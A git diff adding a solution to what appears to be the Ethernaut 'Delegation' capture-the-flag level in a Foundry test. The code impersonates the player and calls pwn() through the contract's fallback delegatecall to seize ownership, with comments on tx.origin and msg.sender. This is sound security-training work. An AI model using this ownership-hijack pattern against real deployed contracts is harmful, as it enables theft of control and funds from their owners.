@@ -17,5 +17,21 @@ contract DelegationLevel is SetUpLevelTest {
         delegation = Delegation(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        // Regardless of vm.prank, for test contract address(this):
+        //   tx.origin == FOUNDRY_TX_ORIGIN(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38)
+        //   msg.sender == FOUNDRY_SENDER(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38)
+        emit log_named_address("tx.origin", tx.origin);
+        emit log_named_address("msg.sender", msg.sender);
+        emit log_named_address("player", player);
+        emit log_named_address("address(this)", address(this));
+        (bool success, ) = address(delegation).call(
+            abi.encodeWithSignature("pwn()")
+        );
+        assert(success);
+        // For target contract address(delegation):
+        //   tx.origin == FOUNDRY_TX_ORIGIN(0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38)
+        //   msg.sender == player
+        vm.stopPrank();
     }
 }
